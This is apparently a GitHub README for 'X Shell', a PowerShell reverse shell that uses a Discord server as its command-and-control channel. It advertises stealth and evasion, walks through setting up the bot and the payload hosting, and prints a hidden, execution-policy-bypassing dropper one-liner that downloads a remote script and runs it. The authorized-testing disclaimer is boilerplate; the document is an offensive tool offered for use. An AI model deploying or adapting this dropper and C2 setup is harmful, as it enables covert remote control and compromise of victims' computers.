![banner](/src/banner.png)
# X Shell: Discord-Based Reverse Shell

## Overview

X Shell is a PowerShell-based reverse shell that leverages a Discord server as its command-and-control (C2) infrastructure. It dynamically creates dedicated Discord channels for each user, enabling organized command execution and response tracking.

## 🚨 Disclaimer

**WARNING:** This tool is strictly for educational and authorized penetration testing purposes. Unauthorized use is illegal and may result in criminal prosecution. Always obtain explicit permission before testing.

## Features

- 🔒 Stealthy PowerShell dropper mechanism
- 🤖 Discord-based command and control
- 🔐 Dynamic channel creation for each session
- 🌐 Flexible script retrieval mechanism

## Architecture

### Components

1. **PowerShell Dropper**
   - Bypasses Windows execution restrictions
   - Retrieves main script from configurable source
   - Minimal footprint for evasion

2. **Script Hosting** *(Optional but Recommended)*
   - Can use Vercel, GitHub Gist, or other hosting
   - Provides secure and fast script retrieval
   - Enables easy script updates

3. **Discord C2 Server**
   - Manages communication channels
   - Executes received PowerShell commands
   - Returns command output

## Requirements

- Discord server
- Discord bot with channel management permissions
- Hosting solution for script retrieval (optional)
- PowerShell environment

## Installation Steps

### 1. Create Discord Bot
- Visit [Discord Developer Portal](https://discord.com/developers/applications)
- Create new application
- Generate bot token
- Configure permissions:
  - Manage Channels
  - Read Messages
  - Send Messages

### 2. Script Hosting *(Recommended)*
**Option A: Vercel Deployment** (Recommended)
- Fork repository
- Deploy to Vercel
- Configure authentication tokens
- Update script serving logic

**Option B: Alternative Hosting**
- Use GitHub Gist
- Private pastebin
- Personal web server
- Ensure secure, authenticated access

### 3. Prepare Deployment
- Update script with:
  - Bot token
  - Server ID
  - Category ID
  - Script retrieval URL

### 4. Execute Dropper
```powershell
powershell -W Hidden -Exec Bypass -c "$r = iwr https://your-script-host.com/ -H @{'Authorization'='Bearer your-token'}; iex $r.Content"
```

## Hosting Considerations

- Use HTTPS for script retrieval
- Implement token-based authentication
- Minimize script exposure
- Regularly rotate access tokens

## Additional Resources

- [Discord Server Template](https://discord.new/AFkzNqmAdmex)
- Preconfigured server with logging channels

## Security Considerations

- Implement strict authentication
- Rotate tokens regularly
- Monitor and log all activities
- Ensure compliance with legal standards

## Contributing

1. Fork the repository
2. Create feature branch
3. Commit changes
4. Push and submit pull request

## License



## Contact

<a href="https://discord.com/users/789782857852911616"><img src="https://skillicons.dev/icons?i=discord"></a>
